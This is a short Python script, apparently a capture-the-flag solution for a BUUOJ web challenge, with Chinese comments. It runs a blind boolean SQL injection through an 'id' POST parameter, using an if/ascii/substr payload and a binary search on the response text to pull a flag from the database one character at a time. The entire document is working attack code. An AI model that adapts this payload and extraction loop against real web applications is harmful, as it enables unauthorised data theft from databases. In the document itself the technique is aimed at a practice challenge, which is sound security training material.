
import requests
import time
#url是随时更新的，具体的以做题时候的为准
url = 'http://e80b35a9-1dbe-4e49-97f8-0bf421c985f7.node3.buuoj.cn/index.php'
data = {"id":""}
flag = 'flag{'
 
i = 6
while True:
#从可打印字符开始
    begin = 32
    end = 126
    tmp = (begin+end)//2
    while begin<end:
        print(begin,tmp,end)
        time.sleep(1)
        data["id"] = "if(ascii(substr((select(flag)from(flag)),{},1))>{},1,2)".format(i,tmp)
        r = requests.post(url,data=data)
        if 'Hello' in r.text:
            begin = tmp+1
            tmp = (begin+end)//2 
        else:
            end = tmp
            tmp = (begin+end)//2
 
    flag+=chr(tmp)
    print(flag)
    i+=1
    if flag[-1]=='}':
        break